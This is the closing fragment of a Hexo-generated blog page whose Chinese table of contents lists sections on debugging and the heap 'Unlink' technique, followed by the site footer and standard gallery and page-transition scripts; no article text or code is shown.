class="toc-text">源代码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">代码调试：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFUnlink%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">什么是Unlink：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%BB%A7%E7%BB%AD%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">调试继续：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unlink%E5%AE%89%E5%85%A8%E6%80%A7%E6%A3%80%E6%9F%A5%EF%BC%9A"><span class="toc-number">4.3.</span> <span class="toc-text">Unlink安全性检查：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E7%BB%A7%E7%BB%AD%EF%BC%9A-1"><span class="toc-number">4.4.</span> <span class="toc-text">调试继续：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Free%E4%B8%8E%E8%A7%A6%E5%8F%91Unlink%EF%BC%9A"><span class="toc-number">4.5.</span> <span class="toc-text">Free与触发Unlink：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%AF%BB%E5%9D%80%EF%BC%9A"><span class="toc-number">4.6.</span> <span class="toc-text">关于寻址：</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>